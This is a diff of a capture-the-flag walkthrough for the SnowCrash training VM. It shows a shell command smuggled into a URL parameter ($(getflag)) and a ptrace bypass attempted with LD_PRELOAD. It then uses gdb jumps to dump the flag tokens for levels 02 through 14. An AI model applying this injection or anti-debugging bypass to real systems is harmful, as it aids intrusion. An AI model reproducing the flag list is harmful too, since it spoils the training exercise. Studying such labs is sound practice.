@@ -112,7 +112,7 @@ reading the following lines` Data :
 ```
 66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c
 ```
-Using hex to ascii, **ft_wandrNDRelL0L**, authentication failure, I guess i have missed the last hex
+Using hex to ascii, **ft_wandrNDRelL**, authentication failure, I guess i have missed the last hex
 ```
 66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c
 ```
@@ -164,6 +164,176 @@ $curl http://10.12.100.115:4747/\?x\=blah
 blah
 ```
 *using the x param, curl prints whatever is passed to it in x=*
+```
 curl http://10.12.100.115:4747/\?x\=$\(getflag\)
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+level04@SnowCrash:~$ su level05
+Password:ne2searoevaevoem4ov4ar8ap
 ```
+## Attempt to reverse /bin/getflag
+Using **binary ninja**
+```
+mov     dword [esp {var_130}], data_8048fa8  {"You should not reverse this"} 
+```
+*fuck you, i do what I waant*
+The binary calls getuid, the returned UID is in eax
+```
+call  getuid
+```
+*return the real user ID of the calling process*
+#### trying to override uid
+```
+(gdb) b getuid
+Breakpoint 2 at 0xb7ee4cc0
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /bin/getflag 
+
+Breakpoint 1, 0x0804894a in main ()
+(gdb) c
+Continuing.
+You should not reverse this
+```
+*debugging is blocked by ptrace()*
+```
+call    ptrace
+```
+Hijacking te ptrace() function using LD_PRELOAD
+*created file /tmp/ptrace.c*
+```
+long ptrace(int request, int pid, int addr, int data)
+{
+     return 0;
+}
+```
+*created fake library
+```
+level05@SnowCrash:/tmp$ gcc /tmp/ptrace.c -o /tmp/ptrace.so -fPIC -shared -ldl -D_GNU_SOURCE
+level05@SnowCrash:/tmp$ export LD_PRELOAD=/tmp/ptrace.so
+```
+gdb
+```
+b getuid
+Breakpoint 1 at 0x80484b0
+(gdb) r
+Starting program: /bin/getflag 
+Injection Linked lib detected exit..
+During startup program exited with code 1.
+```
+*Bad fucking idea*
+#### disassemble main
+Executable calls an ft_dec and then fputs, I suspect it's the lines that print the flag
+```
+0x08048c01 <+699>:   call   0x8048604 <ft_des>
+0x08048c06 <+704>:   mov    %ebx,0x4(%esp)
+0x08048c0a <+708>:   mov    %eax,(%esp)
+0x08048c0d <+711>:   call   0x8048530 <fputs@plt>
+```
+break in main then in **jns     0x80489a8** which is at addr **0x08048990**, because jumping straight to the address after the puts segfaults
+```
+(gdb) b main 
+Breakpoint 1 at 0x804894a
+(gdb) b *0x08048990
+Breakpoint 2 at 0x8048990
+(gdb) r
+Starting program: /bin/getflag 
+
+Breakpoint 1, 0x0804894a in main ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048990 in main ()
+```
+try first jumping to the first address after return from fputs
+```
+(gdb) jump *0x08048c17
+Continuing at 0x8048c17.
+f2av5il02puano7naaf6adaaf
+[Inferior 1 (process 2345) exited normally]
+```
+*this is the level02 password*
+```
+(gdb) jump *0x08048c3b
+Continuing at 0x8048c3b.
+kooda2puivaav1idi4f57q8iq
+[Inferior 1 (process 2365) exited normally]
+```
+*flag for level03*
+```
+(gdb) jump *0x08048c5f
+Continuing at 0x8048c5f.
+qi0maab88jeaj46qoumi7maus
+[Inferior 1 (process 2374) exited normally]
+```
+*level04*
+```
+(gdb) jump *0x08048c83
+Continuing at 0x8048c83.
+ne2searoevaevoem4ov4ar8ap
+[Inferior 1 (process 2375) exited normally]
+```
+*level05*
+```
+(gdb) jump *0x08048ca7
+Continuing at 0x8048ca7.
+viuaaale9huek52boumoomioc
+[Inferior 1 (process 2382) exited normally]
+```
+**all I wanted was this flaaaag for level06**
+```
+(gdb) jump *0x08048ccb
+Continuing at 0x8048ccb.
+wiok45aaoguiboiki2tuin6ub
+[Inferior 1 (process 2519) exited normally]
+```
+*level07*
+```
+(gdb) jump *0x08048cef
+Continuing at 0x8048cef.
+fiumuikeil55xe9cu4dood66h
+[Inferior 1 (process 2526) exited normally]
+```
+*level08*
+```
+(gdb) jump *0x08048d13
+Continuing at 0x8048d13.
+25749xKZ8L7DkSCwJkT9dyv6f
+[Inferior 1 (process 2527) exited normally]
+```
+*level09*
+```
+(gdb) jump *0x08048d37
+Continuing at 0x8048d37.
+s5cAJpM8ev6XHw998pRWG728z
+[Inferior 1 (process 2631) exited normally]
+```
+*level10*
+```
+(gdb) jump *0x08048d5b
+Continuing at 0x8048d5b.
+feulo4b72j7edeahuete3no7c
+[Inferior 1 (process 2638) exited normally]
+```
+*level11*
+```
+(gdb) jump *0x08048d7f
+Continuing at 0x8048d7f.
+fa6v5ateaw21peobuub8ipe6s
+[Inferior 1 (process 2639) exited normally]
+```
+*level12*
+```
+(gdb) jump *0x08048da3
+Continuing at 0x8048da3.
+g1qKMiRpXf53AWhDaU7FEkczr
+[Inferior 1 (process 2656) exited normally]
+```
+*level13*
+```
+(gdb) jump *0x08048dc4
+Continuing at 0x8048dc4.
+2A31L79asukciNyi8uppkEuSx
+[Inferior 1 (process 2721) exited normally]
+```
+*level14*
